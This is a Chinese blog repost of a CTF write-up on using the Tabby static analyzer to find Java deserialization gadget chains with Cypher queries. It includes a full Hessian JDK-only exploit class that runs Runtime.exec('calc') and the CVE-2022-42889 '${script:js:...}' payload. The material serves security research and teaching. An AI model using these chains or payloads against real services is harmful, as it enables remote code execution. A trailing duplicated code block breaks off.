@@ -1,0 +1,256 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java 代码分析工具 Tabby 在 CTF 中的运用 | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="用 Tabby (soot + Neo4j) 静态分析 Java 代码属性图 + Cypher 查询，自动化找反序列化 gadget 链和 hessian JDK-only 链。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java 代码分析工具 Tabby 在 CTF 中的运用">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Misc/Java%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7Tabby%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="用 Tabby (soot + Neo4j) 静态分析 Java 代码属性图 + Cypher 查询，自动化找反序列化 gadget 链和 hessian JDK-only 链。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="Tabby">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Misc/Java%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7Tabby%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java 代码分析工具 Tabby 在 CTF 中的运用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java 代码分析工具 Tabby 在 CTF 中的运用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Java 代码分析工具 Tabby 在 CTF 中的运用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/64572.html">https://www.ctfiot.com/64572.html</a><br>ID: 64572</p>
+</blockquote>
+<p>前言</p>
+<p>随着静态分析技术的不断发展，越来越多安全研究人员开始利用静态分析技术来解决问题，相比于传统手段，利用静态分析技术可以大大减少漏洞挖掘成本和时间，本文将尝试利用一款Java静态代码分析工具tabby来解决最近几场CTF中的题目。</p>
+<p>tabby是一款专门针对Java语言的静态代码分析工具，它基于soot框架生成Java程序的代码属性图并使用Neo4j来存储，我们可以编写Neo4j查询语句来查询代码中存在的调用链。</p>
+<p>前期准备</p>
+<p>关于tabby的基础安装和使用方法已经在其项目主页写的很详细了，参考文末给出的链接即可；这里来介绍一下它的一个扩展tabby-path-finder，该扩展是tabby的污点分析扩展，相对于普通查询，个人实测当链路节点较长时，利用该扩展可以较为精准的查询链路；详细的介绍可以参考下面的项目链接，后续的具体操作会涉及到该扩展。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/tabby-path-finder">https://github.com/wh1t3p1g/tabby-path-finder</a></p>
+<p>To CTF</p>
+<p>2022长城杯-b4bycoffee[新解]</p>
+<p>反编译jar可以看到题目存在着反序列化点，并且有rome依赖。</p>
+<p>反序列化ban掉了这几个类</p>
+<p>this.list &#x3D; new ArrayList&lt;&gt;();<br>this.list.add(BadAttributeValueExpException.class.getName());<br>this.list.add(ObjectBean.class.getName());<br>this.list.add(ToStringBean.class.getName());<br>this.list.add(TemplatesImpl.class.getName());<br>this.list.add(Runtime.class.getName());</p>
+<p>同时Coffeebean中toString存在着能加载字节码的后门</p>
+<p>如果分析过rome反序列化的同学们一眼就能看出来黑名单中没ban掉EqualsBean ，而在链子中EqualsBean的hashcode方法可以触发到任意类的toString方法；很容易想到如下链子</p>
+<p>java.util.HashMap#readObject<br>java.util.HashMap#hash<br>com.rometools.rome.feed.impl.EqualsBean#hashCode<br>com.rometools.rome.feed.impl.EqualsBean#beanHashCode<br>com.example.b4bycoffee.model.CoffeeBean#toString</p>
+<p>那么我们可以思考一下，如果没有rome依赖还能利用吗？</p>
+<p>归纳一下当前的问题，我们需要一个readObject-&gt;toString的链子，则我们可以利用tabby写出如下查询语句</p>
+<p>match (source:<br>Method {NAME:”readObject”,CLASSNAME:”java.util.HashMap”})<br>match (sink:<br>Method {NAME:”toString”})<br>with source, collect(sink) as sinks<br>call tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in [“javax.management.BadAttributeValueExpException”,”com.sun.jmx.snmp.SnmpEngineId”,”com.sun.xml.internal.ws.api.BindingID”,”javax.swing.text.html.HTML$UnknownTag”])<br>return path limit 1</p>
+<p>可以看到在jdk中是存在这样的链条的，调用关系如下</p>
+<p>java.util.HashMap#readObject<br>java.util.HashMap#putVal<br>java.lang.Object#equals<br>com.sun.org.apache.xpath.internal.objects.XString#equals<br>com.example.b4bycoffee.model.CoffeeBean#toString</p>
+<p>exp文中就不给出了，根据调用关系很容易写出来</p>
+<p>2022TCTF-HessianOnlyJdk</p>
+<p>题目考察了hessian的jdk原生的链子，我们可以尝试用tabby来跑一下该链子，首先来总结下hessian反序列化的特性</p>
+<p>1.hessian可反序列化不继承自Serializable的类<br>2.反序列化的起始方法可以为 equals,hashCode,compareTo 方法<br>3.反序列化时不能恢复Iterator,Enumeration,Map,List类型的值</p>
+<p>根据上述条件可以写出如下查询语句</p>
+<p>match (source:<br>Method) where source.NAME in [“equals”,”hashCode”,”compareTo”] <br>with collect(source) as sources<br>match (sink:<br>Method {IS_SINK:<br>true}) where sink.NAME &#x3D;~ “invoke” and sink.VUL &#x3D;~ “CODE” and sink.CLASSNAME &#x3D;~ “java.lang.reflect.Method”<br>with sources, collect(sink) as sinks<br>call tabby.algo.allSimplePaths(sinks,sources, 15, false) yield path <br>where none(n in nodes(path) where (n.CLASSNAME &#x3D;~ “java.util.Iterator” or n.CLASSNAME &#x3D;~ “java.util.Enumeration” or n.CLASSNAME &#x3D;~ “java.util.Map” or n.CLASSNAME &#x3D;~ “java.util.List” or n.CLASSNAME&#x3D;<del>“jdk.nashorn.internal.ir.UnaryNode” or n.CLASSNAME&#x3D;</del>“com.sun.jndi.ldap.ClientId” or n.CLASSNAME&#x3D;~”org.apache.catalina.webresources.TrackedInputStream”))<br>return path limit 1</p>
+<p>可以成功查询到题目提示的链条</p>
+<p>我们可以注意到链条中用到了HashTable的get方法，在HashTable的equals中存在着get的调用，所以直接利用java.util.Hashtable#equals起始即可，题目中ban掉了com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename 这个写文件的方法，我们可以梳理下目前的source需求</p>
+<p>1.目标方法需要为public 和 static的<br>2.sink可以为代码执行，写文件，远程类加载等</p>
+<p>在tabby中内置了一些sink点，分析上面被ban掉的方法我们可以发现调用链长度仅仅为1，这里我们可以查一下sink点有没有直接符合要求的,这里以代码执行为例</p>
+<p>match (m1:<br>Method) where m1.VUL&#x3D;”CODE” and m1.IS_STATIC&#x3D;true and m1.IS_PUBLIC&#x3D;true<br>return m1 limit 50</p>
+<p>可以看到查询结果中 sun.reflect.misc.MethodUtil.invoke 符合我们的要求，这个方法其他wp文章中也有阐述；则可以编写exp如下</p>
+<p>package test;</p>
+<p>import com.caucho.hessian.io.Hessian2Input;<br>import com.caucho.hessian.io.Hessian2Output;<br>import com.caucho.hessian.io.SerializerFactory;<br>import marshalsec.util.Reflections;<br>import sun.reflect.misc.MethodUtil;<br>import sun.swing.SwingLazyValue;<br>import javax.swing.*;<br>import java.io.FileInputStream;<br>import java.io.FileOutputStream;<br>import java.lang.reflect.Array;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.Field;<br>import java.lang.reflect.Method;<br>import java.util.HashMap;<br>import java.util.Hashtable;</p>
+<p>public class Test {<br>    public static void main(String[] args) throws Exception {<br>        SerializerFactory serializerFactory &#x3D; new SerializerFactory();<br>        serializerFactory.setAllowNonSerializable(true);<br>        Class<?> cMimeTypeParameterList = Class.forName("java.awt.datatransfer.MimeTypeParameterList");
+        Constructor<?> conMimeTypeParameterList&#x3D; cMimeTypeParameterList.getDeclaredConstructor();<br>        conMimeTypeParameterList.setAccessible(true);<br>        Object mimeTypeParameterList &#x3D; conMimeTypeParameterList.newInstance();<br>        Field fparameters &#x3D; cMimeTypeParameterList.getDeclaredField(“parameters”);<br>        fparameters.setAccessible(true);<br>        Hashtable&lt;String, String&gt; stringHashtable &#x3D; new Hashtable&lt;&gt;();<br>        stringHashtable.put(“abc”,”xxxxxxxxxxxx”);</p>
+<p>        Method invoke &#x3D; MethodUtil.class.getMethod(“invoke”, Method.class, Object.class, Object[].class);<br>        Method mexec &#x3D; Runtime.class.getMethod(“exec”, String.class);<br>        Object runtime &#x3D; Runtime.getRuntime();<br>        Object[] ags &#x3D; new Object[]{invoke, new Object(), new Object[]{mexec,runtime , new Object[]{“calc”}}};<br>        SwingLazyValue swingLazyValue &#x3D; new SwingLazyValue(“sun.reflect.misc.MethodUtil”, “invoke”,ags);<br>        Object[] keyValueList &#x3D; new Object[]{“abc”,swingLazyValue};<br>        UIDefaults uiDefaults1 &#x3D; new UIDefaults(keyValueList);<br>        UIDefaults uiDefaults2 &#x3D; new UIDefaults(keyValueList);</p>
+<p>        Hashtable&lt;Object, Object&gt; hashtable1 &#x3D; new Hashtable&lt;&gt;();<br>        Hashtable&lt;Object, Object&gt; hashtable2 &#x3D; new Hashtable&lt;&gt;();<br>        hashtable1.put(“a”,uiDefaults1);<br>        hashtable2.put(“a”,uiDefaults2);</p>
+<p>        HashMap&lt;Object, Object&gt; s &#x3D; new HashMap&lt;&gt;();<br>        Reflections.setFieldValue(s, “size”, 2);<br>        Class<?> nodeC;
+        try {
+            nodeC = Class.forName("java.util.HashMap$Node");
+        }
+        catch ( ClassNotFoundException e ) {
+            nodeC = Class.forName("java.util.HashMap$Entry");
+        }
+        Constructor<?> nodeCons &#x3D; nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(true);</p>
+<p>        Object tbl &#x3D; Array.newInstance(nodeC, 2);<br>        Array.set(tbl, 0, nodeCons.newInstance(0, hashtable1, hashtable1, null));<br>        Array.set(tbl, 1, nodeCons.newInstance(0, hashtable2, hashtable2, null));<br>        Reflections.setFieldValue(s, “table”, tbl);<br>        Hessian2Output hessian2Output &#x3D; new Hessian2Output(new FileOutputStream(“hessian.ser”));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(s);<br>        fparameters.set(mimeTypeParameterList,uiDefaults1);<br>        hessian2Output.close();<br>        Hessian2Input hessian2Input &#x3D; new Hessian2Input(new FileInputStream(“hessian.ser”));<br>        hessian2Input.readObject();<br>    }<br>}</p>
+<p>2022网鼎杯青龙组-web214</p>
+<p>可以看到题目存在着和rome中ToStringBean相同的toString方法，该方法可调用目标类的所有getter，同时存在着hessian反序列化点和HikariCP依赖，其中hessian的反序列化用的是dubbo中的hessian依赖。</p>
+<p>其实本题目直接用上文tctf的原生链子就可以了，不过我们可以尝试使用tabby来跑一下HikariCP中的链子，HikariCP是个JDBC连接池组件，所以我们可以尝试跑下jndi的调用</p>
+<p>match path&#x3D;(m1:<br>Method)-[:<br>CALL*..10]-&gt;(m2:<br>Method {IS_SINK:<br>true}) where m1.NAME &#x3D;~ “get.*” and m1.PARAMETER_SIZE&#x3D;0 and m2.VUL&#x3D;”JNDI” and m2.NAME&#x3D;”lookup”<br>return path limit 2</p>
+<p>可以查询出很多条可用的链，排除hessian中的黑名单最后可以得到HikariCP中这样的一条</p>
+<p>com.zaxxer.hikari.HikariDataSource#getConnection()<br>com.zaxxer.hikari.pool.HikariPool.<br>com.zaxxer.hikari.pool.PoolBase.initializeDataSource<br>javax.naming.InitialContext.lookup</p>
+<p>Study From RealWorld</p>
+<p>CVE-2022-42889</p>
+<p>我们可以通过分析过往漏洞来增加我们的查找规则，这里以这几天Apache Commons Text的漏洞举一个例子，测试代码只有简短的两行</p>
+<p>StringSubstitutor interpolator &#x3D; StringSubstitutor.createInterpolator();<br>interpolator.replace(“${script:js:<br>java.lang.Runtime.getRuntime().exec(“calc”)}”);</p>
+<p>分析过后我们可以发现该处漏洞最后是利用ScriptEngineManager来执行脚本代码的，而在tabby中其实内置sink点是没有考虑到这种情况的，所以我们可以手工在配置文件中添加sink</p>
+<p>{“name”:”javax.script.ScriptEngine”, “rules”: [{“function”: “eval”, “type”: “sink”, “vul”: “ScriptEval”, “actions”: {}, “polluted”: [0], “signatures”: [“&lt;javax.script.ScriptEngine: java.lang.Object eval(java.lang.String)&gt;”]}]}</p>
+<p>添加后我们可以编写查询语句测试下</p>
+<p>match (source:<br>Method) where source.NAME&#x3D;”replace” and source.CLASSNAME&#x3D;”org.apache.commons.text.StringSubstitutor”<br>with collect(source) as sources<br>match (sink:<br>Method {IS_SINK:<br>true}) where sink.VUL &#x3D;~ “ScriptEval”<br>with sources, collect(sink) as sinks<br>call tabby.algo.allSimplePaths(sinks,sources,10, false) yield path <br>where none(n in nodes(path) where (n.CLASSNAME &#x3D;~ “java.util.Iterator” or n.CLASSNAME &#x3D;~ “java.util.Enumeration” or n.CLASSNAME &#x3D;~ “java.util.Map” or n.CLASSNAME &#x3D;~ “java.util.List” ))<br>return path limit 1</p>
+<p>可以发现其实这个漏洞与Apache Commons Configuration 的代码执行如出一辙，这也提醒我们通过分析过往漏洞进行总结可以更有效的辅助我们进行新漏洞的挖掘</p>
+<p>总结</p>
+<p>不限于CTF，在实际的漏洞挖掘中我们也可以使用tabby来大幅度地减少工作量，但工具的使用效果归根结底还是在于使用者的思路；从上面的分析我们可以发现tabby并不能直接帮助你自动化的找到漏洞，同时分析结果往往也取决于规则库的完善程度。</p>
+<p>欢迎关注“春秋伽玛”公众号，未来笔者将结合真实的漏洞挖掘案例来分享静态分析工具在真实环境中的灵活用法，敬请期待。</p>
+<p>Reference</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/tabby">https://github.com/wh1t3p1g/tabby</a><br><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/tabby/wiki/Tabby%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8C%97">https://github.com/wh1t3p1g/tabby/wiki/Tabby食用指北</a></p>
+<p>推荐阅读</p>
+<p>使用CodeQL分析CTF题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">this.list = new ArrayList&lt;&gt;();</span><br><span class="line">this.list.add(BadAttributeValueExpException.class.getName());</span><br><span class="line">this.list.add(ObjectBean.class.getName());</span><br><span class="line">this.list.add(ToStringBean.class.getName());</span><br><span class="line">this.list.add(TemplatesImpl.class.getName());</span><br><span class="line">this.list.add(Runtime.class.getName());</span><br><span class="line">java.util.HashMap#readObject</span><br><span class="line">java.util.HashMap#hash</span><br><span class="line">com.rometools.rome.feed.impl.EqualsBean#hashCode</span><br><span class="line">com.rometools.rome.feed.impl.EqualsBean#beanHashCode</span><br><span class="line">com.example.b4bycoffee.model.CoffeeBean#toString</span><br><span class="line">match (source:</span><br><span class="line">Method &#123;NAME:&quot;readObject&quot;,CLASSNAME:&quot;java.util.HashMap&quot;&#125;)</span><br><span class="line">match (sink:</span><br><span class="line">Method &#123;NAME:&quot;toString&quot;&#125;)</span><br><span class="line">with source, collect(sink) as sinks</span><br><span class="line">call tabby.algo.findJavaGadget(source, sinks, 12, false) yield path where none(n in nodes(path) where n.CLASSNAME in [&quot;javax.management.BadAttributeValueExpException&quot;,&quot;com.sun.jmx.snmp.SnmpEngineId&quot;,&quot;com.sun.xml.internal.ws.api.BindingID&quot;,&quot;javax.swing.text.html.HTML$UnknownTag&quot;])</span><br><span class="line">return path limit 1</span><br><span class="line">java.util.HashMap#readObject</span><br><span class="line">java.util.HashMap#putVal</span><br><span class="line">java.lang.Object#equals</span><br><span class="line">com.sun.org.apache.xpath.internal.objects.XString#equals</span><br><span class="line">com.example.b4bycoffee.model.CoffeeBean#toString</span><br><span class="line">1.hessian可反序列化不继承自Serializable的类</span><br><span class="line">2.反序列化的起始方法可以为 equals,hashCode,compareTo 方法</span><br><span class="line">3.反序列化时不能恢复Iterator,Enumeration,Map,List类型的值</span><br><span class="line">match (source:</span><br><span 